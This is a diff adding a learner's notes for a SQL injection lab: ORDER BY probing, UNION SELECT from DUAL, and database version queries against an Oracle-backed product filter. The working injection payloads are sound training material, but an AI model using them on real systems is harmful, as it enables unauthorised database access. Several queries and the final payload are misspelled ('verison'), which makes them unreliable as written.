@@ -1,0 +1,33 @@
+Lab 07 - Sql injection attack, querying the database type and version on Oracle
+
+Sqli injection in product category filter.
+
+End goal: Display the database verison string
+
+Analysis:
+---------
+1. Determine # of columns that the vulnerable quiery is using:
+    'order by 1 -- > 
+    'order by 2 -- > 
+    'order by 3 -- > Internal server error
+    => 3 - 1 = 2 columns
+2. Find which column contain text:
+    select a, b from Products where category='Gifts
+    'UNION select 'a', 'a' from DUAL-- > Oracle Data needs 'FROM' clause, DUAL table from Oracle is accessible to all users.
+    => column 2 is of data type string 
+
+3. Output the verison of the database
+    Visit sql injection cheatsheet from PortSwigger and find the exact query for that particular database
+
+    Oracle: SELECT banner FROM v$version
+            SELECT verison FROM v$instance
+
+    Microsoft: SELECT @@verison
+
+    PostgreSQL: SELECT verison()
+
+    MySQL: SELECT @@verison
+
+    'UNION SELECT banner, NULL from v$verison--
+   
+Check regular expression correctness: https://regex101.com/
